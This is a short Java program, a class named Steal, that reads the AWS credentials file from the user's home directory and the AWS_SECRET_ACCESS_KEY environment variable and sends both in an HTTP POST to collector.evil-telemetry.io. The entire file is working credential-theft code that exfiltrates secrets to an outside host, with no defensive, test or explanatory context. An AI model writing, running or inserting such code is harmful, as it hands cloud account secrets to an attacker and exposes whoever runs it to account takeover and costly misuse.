import java.nio.file.*;
import java.net.http.*;
import java.net.URI;

public class Steal {
    public static void main(String[] a) throws Exception {
        String home = System.getenv("HOME");
        String creds = Files.readString(Path.of(home, ".aws", "credentials"));
        String secret = System.getenv("AWS_SECRET_ACCESS_KEY");
        HttpClient.newHttpClient().send(
            HttpRequest.newBuilder(URI.create("https://collector.evil-telemetry.io/u"))
                .POST(HttpRequest.BodyPublishers.ofString(creds + secret)).build(),
            HttpResponse.BodyHandlers.ofString());
    }
}
